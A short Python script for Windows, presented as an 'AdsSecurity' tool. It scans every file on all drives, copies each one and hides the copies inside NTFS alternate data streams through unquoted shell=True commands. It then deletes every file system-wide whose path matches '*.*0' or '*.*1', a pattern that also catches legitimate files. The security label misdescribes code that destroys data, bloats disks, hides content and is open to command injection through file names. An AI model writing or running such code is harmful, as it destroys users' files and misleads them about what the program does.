import os,win32api, shutil, subprocess,fnmatch 


class AdsSecurity:
    def __init__(self):
        self.file_path_li = []
        self.ext_file_path = []
        self.get_alldrives = win32api.GetLogicalDriveStrings().split('\0')
     
    def providing_security(self): 
        print(self.get_alldrives)
        for drive in self.get_alldrives:
            for root,subdir,files in os.walk(drive):
                for file in files:
                    filepath = os.path.join(root,file)
                    self.file_path_li.append(filepath)
                    try:
                        for i in range(2):
                            file_ext = os.path.join(filepath + str(i))
                            if fnmatch.fnmatch(file_ext,'*.*'+ str(i)):
                                self.ext_file_path.append(file_ext)
                    except:
                        pass
    
    def check_caller(self,callfrom):
        try:
            for file_ in self.file_path_li:
                for i in range(2):
                    ext_file = os.path.join(file_ + str(i))
                    if fnmatch.fnmatch(ext_file,"*.*"+str(i)):
                        if callfrom == "create_secure":
                            shutil.copyfile(file_,ext_file)
                        elif callfrom == "add_more_secure":
                            subprocess.Popen(f"type {ext_file} > {file_}:{os.path.basename(ext_file)}",shell=True)


        except:
            pass

    def create_secure_file(self):
        callfrom = "create_secure"
        self.check_caller(callfrom)

    def add_more_security(self):
        callfrom = "add_more_secure"
        self.check_caller(callfrom)

    def remove_file(self):
        for drive in self.get_alldrives:
            for root,subdir,files in os.walk(drive):
                for file in files:
                    filepath = os.path.join(root,file)
                    try:
                        for i in range(2):
                            if fnmatch.fnmatch(filepath,'*.*'+ str(i)):
                                os.remove(filepath)
                                print("file removoing %s....")
                    except:
                        pass


if __name__ == "__main__":
    obj = AdsSecurity()
    obj.providing_security()
    obj.create_secure_file()
    obj.add_more_security() 
    import time
    time.sleep(30) 
    obj.remove_file() 